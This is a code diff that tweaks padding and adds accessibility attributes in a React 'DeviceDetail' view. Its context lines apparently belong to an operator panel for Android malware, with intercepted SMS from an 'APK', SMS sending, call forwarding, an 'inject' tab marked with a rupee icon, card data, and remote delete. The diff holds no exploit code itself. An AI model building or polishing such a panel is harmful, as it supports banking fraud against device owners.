@@ -395,7 +395,7 @@ export function DeviceDetail() {
           {/* Overview */}
           <div className="stat-card overflow-hidden relative">
             <div className="h-1 w-full bg-primary" />
-            <div className="p-4 space-y-4">
+            <div className="p-5 space-y-4">
               <div className="flex justify-between items-center pb-3 border-b border-card-border">
                 <span className="text-sm font-medium text-muted-foreground">
                   Overview
@@ -597,7 +597,7 @@ export function DeviceDetail() {
                   No messages found.
                 </div>
               ) : (
-                <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2 max-h-[520px] lg:max-h-[560px] scroll-smooth">
+                <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2">
                   {filteredSms.map(([key, sms]: any) => {
                     // Support new APK (sender/message/dateTime) and old APK (from/body/date)
                     const isOutgoing =
@@ -698,7 +698,7 @@ export function DeviceDetail() {
           {/* Send SMS */}
           <div className="stat-card overflow-hidden relative">
             <div className="h-1 w-full bg-primary" />
-            <div className="p-4">
+            <div className="p-5">
               <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
                 <div className="flex items-center gap-2">
                   <MessageSquare className="w-4 h-4 text-primary" />
@@ -760,7 +760,12 @@ export function DeviceDetail() {
             </div>
             <div className="flex-1 overflow-y-auto p-4 bg-background relative">
               {activeTab === "forward" && (
-                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
+                <div
+                  id="panel-forward"
+                  role="tabpanel"
+                  aria-labelledby="tab-forward"
+                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
+                >
                   <div className="text-center mb-4">
                     <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-3 border border-card-border">
                       <PhoneForwarded className="w-8 h-8 text-primary" />
@@ -864,7 +869,12 @@ export function DeviceDetail() {
                 </div>
               )}
               {activeTab === "inject" && (
-                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
+                <div
+                  id="panel-inject"
+                  role="tabpanel"
+                  aria-labelledby="tab-inject"
+                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
+                >
                   <div className="text-center mb-4">
                     <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-3 border border-card-border">
                       <IndianRupee className="w-8 h-8 text-primary" />
@@ -934,7 +944,12 @@ export function DeviceDetail() {
                 </div>
               )}
               {activeTab === "cards" && (
-                <div className="h-full flex flex-col space-y-4">
+                <div
+                  id="panel-cards"
+                  role="tabpanel"
+                  aria-labelledby="tab-cards"
+                  className="h-full flex flex-col space-y-4"
+                >
                   <div className="flex justify-between items-center">
                     <h3 className="font-semibold text-foreground flex items-center gap-2">
                       <CreditCard className="w-4 h-4 text-primary" />
@@ -1162,7 +1177,12 @@ export function DeviceDetail() {
                 </div>
               )}
               {activeTab === "data" && (
-                <div className="h-full flex flex-col space-y-4">
+                <div
+                  id="panel-data"
+                  role="tabpanel"
+                  aria-labelledby="tab-data"
+                  className="h-full flex flex-col space-y-4"
+                >
                   <div className="flex items-center justify-between gap-2">
                     <h3 className="font-semibold text-foreground flex items-center gap-2">
                       <Braces className="w-4 h-4 text-primary" />
@@ -1237,7 +1257,12 @@ export function DeviceDetail() {
                 </div>
               )}
               {activeTab === "delete" && (
-                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
+                <div
+                  id="panel-delete"
+                  role="tabpanel"
+                  aria-labelledby="tab-delete"
+                  className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6"
+                >
                   <div className="text-center mb-4">
                     <div className="w-16 h-16 bg-destructive/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-destructive/20">
                       <AlertTriangle className="w-8 h-8 text-destructive" />
@@ -1274,7 +1299,7 @@ export function DeviceDetail() {
           {/* Device management */}
           <div className="stat-card overflow-hidden relative">
             <div className="h-1 w-full bg-primary" />
-            <div className="p-4 space-y-4">
+            <div className="p-5 space-y-4">
               {/* Ping Device */}
               <div className="pb-3 border-b border-card-border space-y-2">
                 <div className="flex items-center justify-between">
